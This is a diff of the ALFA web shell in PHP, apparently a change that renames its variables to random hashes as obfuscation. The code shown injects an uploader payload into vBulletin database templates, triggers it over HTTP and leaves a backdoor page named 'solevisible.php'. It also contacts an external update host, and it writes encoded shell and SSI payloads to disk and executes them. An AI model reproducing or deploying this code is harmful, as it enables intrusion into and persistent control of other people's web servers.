+$lkcqmele343d9040a671c45832ee5381860e2996 = 'http://'.$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e."/solevisible.php";
+echo "<br><pre id='strOutput' style='margin-top:5px' class='ml1'><br><center><b><font color='#FFFFFF'>Please Go To Target => </font><a href='".$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31."' target='_blank'>".$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31."</a><br/><font color='#FFFFFF'>And Go To => </font><a href='".$lkcqmele343d9040a671c45832ee5381860e2996."' target='_blank'>".$lkcqmele343d9040a671c45832ee5381860e2996."</a></b></center><br><br>";
 }}}}
 if(isset($_POST['alfa3']) && $_POST['alfa3']== 'vb'){
 AlfaNum(1,2,7,9,10);
 echo __pre().'<p><div class="txtfont_header">| vbulletin |</div></p><p>'.getConfigHtml('vb').'</p><form name="frm" method="POST" onsubmit="g(\'ShellInjectors\',null,null,this.lo.value,\'vb\',this.user.value,this.pass.value,this.tab.value,this.db.value,this.method.value); return false;">';
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'lo', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'db', 'id'=>'db_name','inputValue' => '', 'inputSize' => '50'),
@@ -1987,76 +2061,76 @@ $table = array('td1' =>
  'td5' =>
  array('color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'tab', 'id'=>'db_prefix','inputValue' => '', 'inputSize' => '50')
 );
-create_table($table);
-echo $selector;
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
+echo $gheoiswh5b3c32009797feb79096d52e56a56b82;
 echo '<p><input type="submit" value=" " /></p></form></center>';
 if(isset($_POST['alfa4'])&&!empty($_POST['alfa4'])){
-$method = $_POST['alfa8'];
-$faq_name = "faq";
-$faq_file = "/faq.php";
-$code = "{\${".ALFA_UPLOADER."}}{\${exit()}}&";
-$conn=@mysqli_connect($_POST['alfa2'],$_POST['alfa4'],$_POST['alfa5'],$_POST['alfa7']) or die(@mysqli_connect_error());
-$rec = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$faq_name."'";
-$recivedata = @mysqli_query($conn,$rec);
-$getd = @mysqli_fetch_assoc($recivedata);
-$savetoass = $getd['template'];
-if(empty($savetoass)){
-	$faq_name = "header";
-	$faq_file = "/";
-	$rec = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$faq_name."'";
-	$recivedata = @mysqli_query($conn,$rec);
-	$getd = @mysqli_fetch_assoc($recivedata);
-	$savetoass = $getd['template'];
-	$code = ALFA_UPLOADER.";";
+$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa8'];
+$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8 = "faq";
+$hrtpbjqu96de4270c62b50d81d50b79979c2f176 = "/faq.php";
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = "{\${".ALFA_UPLOADER."}}{\${exit()}}&";
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($_POST['alfa2'],$_POST['alfa4'],$_POST['alfa5'],$_POST['alfa7']) or die(@mysqli_connect_error());
+$oulgydyw0b2c082c00e002a2f571cbe340644239 = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8."'";
+$vdbzowipec3b61eb147ecad9e7e8669500b5b5ba = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$oulgydyw0b2c082c00e002a2f571cbe340644239);
+$erjqjwtqbaf98aca18c12af1244f41f2a37a2915 = @mysqli_fetch_assoc($vdbzowipec3b61eb147ecad9e7e8669500b5b5ba);
+$wrqwflccac8c0e94d5ffa40c8c68ed374eba6fb8 = $erjqjwtqbaf98aca18c12af1244f41f2a37a2915['template'];
+if(empty($wrqwflccac8c0e94d5ffa40c8c68ed374eba6fb8)){
+	$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8 = "header";
+	$hrtpbjqu96de4270c62b50d81d50b79979c2f176 = "/";
+	$oulgydyw0b2c082c00e002a2f571cbe340644239 = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8."'";
+	$vdbzowipec3b61eb147ecad9e7e8669500b5b5ba = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$oulgydyw0b2c082c00e002a2f571cbe340644239);
+	$erjqjwtqbaf98aca18c12af1244f41f2a37a2915 = @mysqli_fetch_assoc($vdbzowipec3b61eb147ecad9e7e8669500b5b5ba);
+	$wrqwflccac8c0e94d5ffa40c8c68ed374eba6fb8 = $erjqjwtqbaf98aca18c12af1244f41f2a37a2915['template'];
+	$nndigmblc13367945d5d4c91047b3b50234aa7ab = ALFA_UPLOADER.";";
 }
-$code = str_replace("'","\'",$code);
-$p = "UPDATE ".$_POST['alfa6']."template SET `template`='".$code."' WHERE `title`='".$faq_name."'";
-$ka= @mysqli_query($conn,$p) or die(mysqli_error($conn));
-$geturl = @mysqli_query($conn,"select `value` from ".$_POST['alfa6']."setting WHERE `varname`='bburl'");
-$getval = @mysqli_fetch_assoc($geturl);
-$saveval = $getval['value'];
-if($faq_name == "header"){
-	if(substr($saveval, -5, 5) == "/core"){
-		$saveval = substr($saveval, 0, -5);
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = str_replace("'","\'",$nndigmblc13367945d5d4c91047b3b50234aa7ab);
+$fxuvmwpb83878c91171338902e0fe0fb97a8c47a = "UPDATE ".$_POST['alfa6']."template SET `template`='".$nndigmblc13367945d5d4c91047b3b50234aa7ab."' WHERE `title`='".$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8."'";
+$pgapzbvo2c68e1d50809e4ae357bcffe1fc99d2a= @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$fxuvmwpb83878c91171338902e0fe0fb97a8c47a) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$jxnfsvuo6b72d14a2b5f0d92a740ccb55a2599d8 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select `value` from ".$_POST['alfa6']."setting WHERE `varname`='bburl'");
+$nzywpaqdbbbd3f37a459b4dde4d3ba35c09e60d9 = @mysqli_fetch_assoc($jxnfsvuo6b72d14a2b5f0d92a740ccb55a2599d8);
+$dmwiusteeb1b9a42cc6261763640a6ff0b4dff70 = $nzywpaqdbbbd3f37a459b4dde4d3ba35c09e60d9['value'];
+if($ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8 == "header"){
+	if(substr($dmwiusteeb1b9a42cc6261763640a6ff0b4dff70, -5, 5) == "/core"){
+		$dmwiusteeb1b9a42cc6261763640a6ff0b4dff70 = substr($dmwiusteeb1b9a42cc6261763640a6ff0b4dff70, 0, -5);
 	}
 }
-$realurl = parse_url($saveval,PHP_URL_HOST);
-$realpath = parse_url($saveval,PHP_URL_PATH);
-$res = false;
-$AlfaCurl = new AlfaCURL();
-if(extension_loaded('sockets') && function_exists('fsockopen') && $method == 'auto'){
-if($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
-@fputs($fsock, "GET $realpath.$faq_file HTTP/1.1\r\n");
-@fputs($fsock, "HOST: $realurl\r\n");
-@fputs($fsock, "Connection: close\r\n\r\n");
-$check = fgets($fsock);
-if(preg_match("/200 OK/i",$check)){
-$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
-$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
-$res = true;
+$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5 = parse_url($dmwiusteeb1b9a42cc6261763640a6ff0b4dff70,PHP_URL_HOST);
+$qixiukvof1717c0d3bb9106455d837859192864e = parse_url($dmwiusteeb1b9a42cc6261763640a6ff0b4dff70,PHP_URL_PATH);
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = false;
+$qtzwvaxf0f3bcb5d866baa3eb38bf9b21ee8d4f3 = new AlfaCURL();
+if(extension_loaded('sockets') && function_exists('fsockopen') && $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'auto'){
+if($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650 = @fsockopen($hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5, 80, $irrxgcsz70106d0d821513f45702b7d25664ab7c, $ivgnqlyv809b1abe3f111fd3bb1a54c62706129f, 10)){
+@fputs($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650, "GET $qixiukvof1717c0d3bb9106455d837859192864e.$hrtpbjqu96de4270c62b50d81d50b79979c2f176 HTTP/1.1\r\n");
+@fputs($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650, "HOST: $hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5\r\n");
+@fputs($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650, "Connection: close\r\n\r\n");
+$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = fgets($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650);
+if(preg_match("/200 OK/i",$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87)){
+$ccwcuucaec6ef230f1828039ee794566b9c58adc = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$wrqwflccac8c0e94d5ffa40c8c68ed374eba6fb8)."' WHERE title ='".$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8."'";
+$fvltfwqj38435cfe0222f21389afa61c215a6baa= @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$ccwcuucaec6ef230f1828039ee794566b9c58adc) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = true;
 }
-@fclose($fsock);
+@fclose($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650);
 }
-}elseif(function_exists('curl_version') && $method == 'auto'){
-$AlfaCurl->Send($realurl.$realpath.$faq_file);
-$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
-$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
-$res = true;
+}elseif(function_exists('curl_version') && $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'auto'){
+$qtzwvaxf0f3bcb5d866baa3eb38bf9b21ee8d4f3->Send($hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e.$hrtpbjqu96de4270c62b50d81d50b79979c2f176);
+$ccwcuucaec6ef230f1828039ee794566b9c58adc = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$wrqwflccac8c0e94d5ffa40c8c68ed374eba6fb8)."' WHERE title ='".$ogrdfwwn12b1750a44e5f09f2e52ffa7287967e8."'";
+$fvltfwqj38435cfe0222f21389afa61c215a6baa= @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$ccwcuucaec6ef230f1828039ee794566b9c58adc) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = true;
 }
-if($res){
-$ff = 'http://'.$realurl.$realpath."/solevisible.php";
-output($ff);
+if($ybaqpbzt9b207167e5381c47682c6b4f58a623fb){
+$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31 = 'http://'.$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e."/solevisible.php";
+output($uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31);
 }else{
-$ff = 'http://'.$realurl.$realpath.$faq_file;
-$fff = 'http://'.$realurl.$realpath."/solevisible.php";
-echo "<center><p><font color=\"#FFFFFF\">First Open This Link => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color=\"#FFFFFF\">Second Open This Link => </font><a href='".$fff."' target='_blank'>".$fff."</a></center></p>";}}}
+$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31 = 'http://'.$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e.$hrtpbjqu96de4270c62b50d81d50b79979c2f176;
+$lkcqmele343d9040a671c45832ee5381860e2996 = 'http://'.$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e."/solevisible.php";
+echo "<center><p><font color=\"#FFFFFF\">First Open This Link => </font><a href='".$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31."' target='_blank'>".$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31."</a><br/><font color=\"#FFFFFF\">Second Open This Link => </font><a href='".$lkcqmele343d9040a671c45832ee5381860e2996."' target='_blank'>".$lkcqmele343d9040a671c45832ee5381860e2996."</a></center></p>";}}}
 echo '</div>';
 alfafooter();
 }
 function alfacheckfiletype(){
-	$path = $_POST['path'];
-	$arg = $_POST['arg'];
-	if(@is_file($path.'/'.$arg)){
+	$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $_POST['path'];
+	$mcpievhm61dd86c2dc75c3f569ec619bd283a33f = $_POST['arg'];
+	if(@is_file($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485.'/'.$mcpievhm61dd86c2dc75c3f569ec619bd283a33f)){
 		echo("file");
 	}else{
 		echo("dir");
@@ -2072,66 +2146,66 @@ function alfacheckupdate(){
 		}
 	}
 	if(function_exists("curl_version")){
-		$update = new AlfaCURL();
-		$json = $update->Send("http://solevisible.com/update.json?ver=".__ALFA_VERSION__);
-		$json = @json_decode($json,true);
-		$data = array();
-		if($json){
-			if(!isset($_COOKIE['alfa_checkupdate']) && !empty($json["type"])){
-				if($json["type"] == "update"){
-					if(__ALFA_VERSION__ != $json['version'] || __ALFA_UPDATE__ != $json['version_number']){
+		$fflfxfri3ac340832f29c11538fbe2d6f75e8bcc = new AlfaCURL();
+		$enjzynvd466deec76ecdf5fca6d38571f6324d54 = $fflfxfri3ac340832f29c11538fbe2d6f75e8bcc->Send("http://solevisible.com/update.json?ver=".__ALFA_VERSION__);
+		$enjzynvd466deec76ecdf5fca6d38571f6324d54 = @json_decode($enjzynvd466deec76ecdf5fca6d38571f6324d54,true);
+		$sfmsaibm8d777f385d3dfec8815d20f7496026dc = array();
+		if($enjzynvd466deec76ecdf5fca6d38571f6324d54){
+			if(!isset($_COOKIE['alfa_checkupdate']) && !empty($enjzynvd466deec76ecdf5fca6d38571f6324d54["type"])){
+				if($enjzynvd466deec76ecdf5fca6d38571f6324d54["type"] == "update"){
+					if(__ALFA_VERSION__ != $enjzynvd466deec76ecdf5fca6d38571f6324d54['version'] || __ALFA_UPDATE__ != $enjzynvd466deec76ecdf5fca6d38571f6324d54['version_number']){
 						@setcookie("alfa_checkupdate", "1", time()+86400);
-						$data["content"] = '<div class="update-holder">'.$json["content"].'</div>';
+						$sfmsaibm8d777f385d3dfec8815d20f7496026dc["content"] = '<div class="update-holder">'.$enjzynvd466deec76ecdf5fca6d38571f6324d54["content"].'</div>';
 					}
 				}
 			}
-			if(isset($json["ads"]) && !empty($json["ads"])){
-				$data["content"] .= $json["ads"];
+			if(isset($enjzynvd466deec76ecdf5fca6d38571f6324d54["ads"]) && !empty($enjzynvd466deec76ecdf5fca6d38571f6324d54["ads"])){
+				$sfmsaibm8d777f385d3dfec8815d20f7496026dc["content"] .= $enjzynvd466deec76ecdf5fca6d38571f6324d54["ads"];
 			}
-			if(isset($json["copyright"]) && !empty($json["copyright"])){
-				$data["copyright"] = $json["copyright"];
+			if(isset($enjzynvd466deec76ecdf5fca6d38571f6324d54["copyright"]) && !empty($enjzynvd466deec76ecdf5fca6d38571f6324d54["copyright"])){
+				$sfmsaibm8d777f385d3dfec8815d20f7496026dc["copyright"] = $enjzynvd466deec76ecdf5fca6d38571f6324d54["copyright"];
 			}
-			if(isset($json["solevisible"]) && !empty($json["solevisible"])){
-				$data["solevisible"] = $json["solevisible"];
+			if(isset($enjzynvd466deec76ecdf5fca6d38571f6324d54["solevisible"]) && !empty($enjzynvd466deec76ecdf5fca6d38571f6324d54["solevisible"])){
+				$sfmsaibm8d777f385d3dfec8815d20f7496026dc["solevisible"] = $enjzynvd466deec76ecdf5fca6d38571f6324d54["solevisible"];
 			}
-			if(isset($json["code_name"]) && !empty($json["code_name"])){
-				$data["code_name"] = $json["code_name"];
-				$data["version_number"] = __ALFA_VERSION__;
+			if(isset($enjzynvd466deec76ecdf5fca6d38571f6324d54["code_name"]) && !empty($enjzynvd466deec76ecdf5fca6d38571f6324d54["code_name"])){
+				$sfmsaibm8d777f385d3dfec8815d20f7496026dc["code_name"] = $enjzynvd466deec76ecdf5fca6d38571f6324d54["code_name"];
+				$sfmsaibm8d777f385d3dfec8815d20f7496026dc["version_number"] = __ALFA_VERSION__;
 			}
-			if(isset($json["market"]) && !empty($json["market"])){
-				$data["market"] = $json["market"];
+			if(isset($enjzynvd466deec76ecdf5fca6d38571f6324d54["market"]) && !empty($enjzynvd466deec76ecdf5fca6d38571f6324d54["market"])){
+				$sfmsaibm8d777f385d3dfec8815d20f7496026dc["market"] = $enjzynvd466deec76ecdf5fca6d38571f6324d54["market"];
 			}
-			echo @json_encode($data);
+			echo @json_encode($sfmsaibm8d777f385d3dfec8815d20f7496026dc);
 		}
 	}
 }
-function alfaWriteTocgiapi($name, $source){
-	$temp = "";
-	$not_api = array("basedir.alfa", "getdir.alfa", "getheader.alfa");
-	if(in_array($name, $not_api)){
-		$temp = ALFA_TEMPDIR;
-		if($temp){
-			@chdir($temp);
+function alfaWriteTocgiapi($kkkpgnftb068931cc450442b63f5b3d276ea4297, $kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb){
+	$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f = "";
+	$zfkuxglj5434fe307c9b9725fbb4ceb5e91b7e13 = array("basedir.alfa", "getdir.alfa", "getheader.alfa");
+	if(in_array($kkkpgnftb068931cc450442b63f5b3d276ea4297, $zfkuxglj5434fe307c9b9725fbb4ceb5e91b7e13)){
+		$dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f = ALFA_TEMPDIR;
+		if($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f){
+			@chdir($dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f);
 		}
 	}else{
 		alfaCreateParentFolder();
 		@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
 	}
 	@mkdir('alfacgiapi',0755);
-	__write_file("alfacgiapi/".$name, __get_resource($source));
-	@chmod("alfacgiapi/".$name, 0755);
-	return $temp;
+	__write_file("alfacgiapi/".$kkkpgnftb068931cc450442b63f5b3d276ea4297, __get_resource($kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb));
+	@chmod("alfacgiapi/".$kkkpgnftb068931cc450442b63f5b3d276ea4297, 0755);
+	return $dbozzfgc3d801aa532c1cec3ee82d87a99fdf63f;
 }
 function alfacheckcgi(){if(strlen(alfaEx("id",false,true,true))>0)echo("ok");else echo("no");}
 function alfaupdateheader(){
 	if(!isset($_COOKIE["updateheader_data"])){
-		$bash = "zZRdb9owFIavya849dIGJLK0vVyFNFTohERBgtFdQIRM4hAL40R2UkYp/312gPARqLqbaYnyIfs8x+85r+UvV04qhTOh3JGhMeg3nwbtWnnqecDUoz8+zPGMQBzGEBPBIF4mYcRBpJMlJFjA9I3GMNm+MAvwPXCFRR5OCMiU+pqqGI3ur067W280e/1aeTElCQQk8UJgS/4bGOUzCV6q0usZtojtORUiEhWDeGEENgFrhVJJgpShb8ORZxlBJIAC5WCuNqqH3931A/iRAepahNQLa2Y5+4JJK0ZpOIQrsN8AmdkgAteFmxvY5R8hk45Q1VK5q4YfcZKvjEbqdqsjD+3FID9acBZhn4iinoNS/62olOM5UXqQZZazf7AxvKu+JmB7d/bd/W3FyiDrEJJEUH9LyQTrWEDXKQzhegAuUtpu0RluKqI0PgNONfjjA9CP5phyqUE98dLq/RzU2+NG97ne6vRryFH7wnmlIkkxczbBqtlESGR06s/Nxvix23nahuki/a9exANkvNTbrXq/mWfAjGJJpKNneuMMVVOvWGwoNU4DUAbobponKrQRD5CEhBulbZT4OKq0K9As48UMrGansYoF5Ql0emsLTtEK7PqgLYQSYftljhpwYQ0mC3HvsPDAZseZjxKb+/79jfQ9VcgtyQGOHrFiegT7aguc2ANuRgTUyAWRgiC99XNDtm4Wx7deXrLogLvQt4OYsz07duP8isWUedB/7sOnXbgs9KT2w6CzxW/0fX6baH35ceGu1SnxBw==";
-		$realdir = addslashes(dirname($_SERVER["SCRIPT_FILENAME"]));
-		$tmp_path = alfaWriteTocgiapi("getheader.alfa",$bash);
-		$data = alfaEx("cd '{$tmp_path}/alfacgiapi';sh getheader.alfa",false,true,true);
-		if(@is_array(@json_decode($data,true))){
-			__alfa_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
-			echo $data;
+		$ozurlglxd574d4bb40c84861791a694a999cce69 = "zZRdb9owFIavya849dIGJLK0vVyFNFTohERBgtFdQIRM4hAL40R2UkYp/312gPARqLqbaYnyIfs8x+85r+UvV04qhTOh3JGhMeg3nwbtWnnqecDUoz8+zPGMQBzGEBPBIF4mYcRBpJMlJFjA9I3GMNm+MAvwPXCFRR5OCMiU+pqqGI3ur067W280e/1aeTElCQQk8UJgS/4bGOUzCV6q0usZtojtORUiEhWDeGEENgFrhVJJgpShb8ORZxlBJIAC5WCuNqqH3931A/iRAepahNQLa2Y5+4JJK0ZpOIQrsN8AmdkgAteFmxvY5R8hk45Q1VK5q4YfcZKvjEbqdqsjD+3FID9acBZhn4iinoNS/62olOM5UXqQZZazf7AxvKu+JmB7d/bd/W3FyiDrEJJEUH9LyQTrWEDXKQzhegAuUtpu0RluKqI0PgNONfjjA9CP5phyqUE98dLq/RzU2+NG97ne6vRryFH7wnmlIkkxczbBqtlESGR06s/Nxvix23nahuki/a9exANkvNTbrXq/mWfAjGJJpKNneuMMVVOvWGwoNU4DUAbobponKrQRD5CEhBulbZT4OKq0K9As48UMrGansYoF5Ql0emsLTtEK7PqgLYQSYftljhpwYQ0mC3HvsPDAZseZjxKb+/79jfQ9VcgtyQGOHrFiegT7aguc2ANuRgTUyAWRgiC99XNDtm4Wx7deXrLogLvQt4OYsz07duP8isWUedB/7sOnXbgs9KT2w6CzxW/0fX6baH35ceGu1SnxBw==";
+		$nmetxdku8dd6ad7684b79ac5ea8914ed4de6eb0f = addslashes(dirname($_SERVER["SCRIPT_FILENAME"]));
+		$fjvlsuooad616a4bf9c50c6d567971ff896b5f29 = alfaWriteTocgiapi("getheader.alfa",$ozurlglxd574d4bb40c84861791a694a999cce69);
+		$sfmsaibm8d777f385d3dfec8815d20f7496026dc = alfaEx("cd '{$fjvlsuooad616a4bf9c50c6d567971ff896b5f29}/alfacgiapi';sh getheader.alfa",false,true,true);
+		if(@is_array(@json_decode($sfmsaibm8d777f385d3dfec8815d20f7496026dc,true))){
+			__alfa_set_cookie("updateheader_data", __ZW5jb2Rlcg($sfmsaibm8d777f385d3dfec8815d20f7496026dc));
+			echo $sfmsaibm8d777f385d3dfec8815d20f7496026dc;
 		}
 	}else{
 		echo __ZGVjb2Rlcg($_COOKIE["updateheader_data"]);
@@ -2145,8 +2219,8 @@ alfaCreateParentFolder();
 @mkdir('alfa_shtml',0755);
 @chdir('alfa_shtml');
 alfacgihtaccess('shtml');
-$code = 'rVb9b9s2EP1Xrky22MhsKcu6ptbH0A+vzYbCXeztl6YoZImS2VCkQFJOvCX/+46SrChOnKRBA8ORyOPju3ePR/vPBoOdWIqUZUCVynUWkE9jpaT6TAaD0O9Ma/YvTXMTkPnKUN3OshToRaEC0jslu+9ns49f3kwmfx6PTwkEcEpOSR8uL8FOnoz/+ns8nX35MJ69n7zF+Wc24N14hjEE1niaGlhGiKcXnOATL2lAuIYBj66DKNf03hVdJterRIJs8Q2+C/OPk+kW6kzELXVnOLzjQ03sFJHW58lDSXWwNpOCzawWJuehv6BREvqGGU7DVzyNYEajHKbTY5guKOe+U0/5OlasMMAjkZVRhlS/RsuoHiRhWorYMCkgkcz0IJcJhT78x9IejsRlToUZxlKeMWrFIMROIl+oxzQquBE21AW3SMTDWC+VqmfzA4aRrof//PXSIaciMwsP9vcZ9Dc3C9Zhn3DNZ9hHPCwiU1QHs0X5E7gH8Eck4ODlCxdcd1R94N2HGfGubkO1Ixk1Y07t4+vVcbJOd1jJ7rVRXMaR1WSoKJdR0ut7V61MRmYZpz1giVViO7KdH2qz4nSYMJQkWiGP3jeFo9xCCor2/A3IHEmdERg1Y96V79QlDH2nNsJcJiuQwjIOyLaN9mKZ55FI9vrDFEM05kZgnsWSS/Tgjlv9EYg4E2fYAVAWNGXnBbdRoZ+wZejHiEnxZXEY+qkUBtYgz1/G8eEhCS/hDlfCpe/YaEsbFzprFAvbPod+2WDaZhSQ/QOCmcWcxcijqcAeFcs9y75SLSBxqbRUo0IyC+JVZEaKJh4Jx2LJlLQaABOpbAngJs68wwHTwkIEBJFb2KYaI6t6A7rz64tXr9/+7jViFIrWR7lQdmuxtEfbqUbttFOJVX/f0u5xmWK/e2Smb+rqAh470HUT2JJrTchmjLXOBKJWEwTOWWIWATlw3R/QGVIlFGuKlrDCVI23YTGP4rNMyVIkg0aW2jzezZ57/31QNcUbEt9sdY3E8w2H1QWwhUXK0Fi6TXUejn4Uc1143W8EUDnk1CwkJoKnwuqsy3nOjD0t2LGuj4atLBNFacCsCkzV0AsMrwt01EjRBJOwge/G17DtzXBSCgR0LIFbPt8o/WaCJ1SX3HQyu3lgLLFI0ahzgukv1E2OKiSNVfwZQZU8t4/PSXP9XNAY4jwJdrGc1T3krHHwaql8AX5r129zKl5ij3TqpKCqarIaUSBlnOoHz2V1RT7Srt/JpfXdX9m0Rny6Wf9h9LxKFHrYjkwZcexGMS8T2h91KvyQdQup7/Du0gLf69wjt9KwCnySa7flNUX0BxLYtrTSL7X0oJEk2EVNrJj1yuonaNf+T3Z9I/WtfTrmv9WuHXul2ovK/tz6Hw==';
-@__write_file('alfa_ssi.shtml',__get_resource($code));
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = 'rVb9b9s2EP1Xrky22MhsKcu6ptbH0A+vzYbCXeztl6YoZImS2VCkQFJOvCX/+46SrChOnKRBA8ORyOPju3ePR/vPBoOdWIqUZUCVynUWkE9jpaT6TAaD0O9Ma/YvTXMTkPnKUN3OshToRaEC0jslu+9ns49f3kwmfx6PTwkEcEpOSR8uL8FOnoz/+ns8nX35MJ69n7zF+Wc24N14hjEE1niaGlhGiKcXnOATL2lAuIYBj66DKNf03hVdJterRIJs8Q2+C/OPk+kW6kzELXVnOLzjQ03sFJHW58lDSXWwNpOCzawWJuehv6BREvqGGU7DVzyNYEajHKbTY5guKOe+U0/5OlasMMAjkZVRhlS/RsuoHiRhWorYMCkgkcz0IJcJhT78x9IejsRlToUZxlKeMWrFIMROIl+oxzQquBE21AW3SMTDWC+VqmfzA4aRrof//PXSIaciMwsP9vcZ9Dc3C9Zhn3DNZ9hHPCwiU1QHs0X5E7gH8Eck4ODlCxdcd1R94N2HGfGubkO1Ixk1Y07t4+vVcbJOd1jJ7rVRXMaR1WSoKJdR0ut7V61MRmYZpz1giVViO7KdH2qz4nSYMJQkWiGP3jeFo9xCCor2/A3IHEmdERg1Y96V79QlDH2nNsJcJiuQwjIOyLaN9mKZ55FI9vrDFEM05kZgnsWSS/Tgjlv9EYg4E2fYAVAWNGXnBbdRoZ+wZejHiEnxZXEY+qkUBtYgz1/G8eEhCS/hDlfCpe/YaEsbFzprFAvbPod+2WDaZhSQ/QOCmcWcxcijqcAeFcs9y75SLSBxqbRUo0IyC+JVZEaKJh4Jx2LJlLQaABOpbAngJs68wwHTwkIEBJFb2KYaI6t6A7rz64tXr9/+7jViFIrWR7lQdmuxtEfbqUbttFOJVX/f0u5xmWK/e2Smb+rqAh470HUT2JJrTchmjLXOBKJWEwTOWWIWATlw3R/QGVIlFGuKlrDCVI23YTGP4rNMyVIkg0aW2jzezZ57/31QNcUbEt9sdY3E8w2H1QWwhUXK0Fi6TXUejn4Uc1143W8EUDnk1CwkJoKnwuqsy3nOjD0t2LGuj4atLBNFacCsCkzV0AsMrwt01EjRBJOwge/G17DtzXBSCgR0LIFbPt8o/WaCJ1SX3HQyu3lgLLFI0ahzgukv1E2OKiSNVfwZQZU8t4/PSXP9XNAY4jwJdrGc1T3krHHwaql8AX5r129zKl5ij3TqpKCqarIaUSBlnOoHz2V1RT7Srt/JpfXdX9m0Rny6Wf9h9LxKFHrYjkwZcexGMS8T2h91KvyQdQup7/Du0gLf69wjt9KwCnySa7flNUX0BxLYtrTSL7X0oJEk2EVNrJj1yuonaNf+T3Z9I/WtfTrmv9WuHXul2ovK/tz6Hw==';
+@__write_file('alfa_ssi.shtml',__get_resource($nndigmblc13367945d5d4c91047b3b50234aa7ab));
 @chmod("alfa_ssi.shtml",0755);
 echo AlfaiFrameCreator('alfa_shtml/alfa_ssi.shtml');
 echo '</div>';
@@ -2158,52 +2232,52 @@ AlfaNum(8,9,10,7,6,5,4,3);
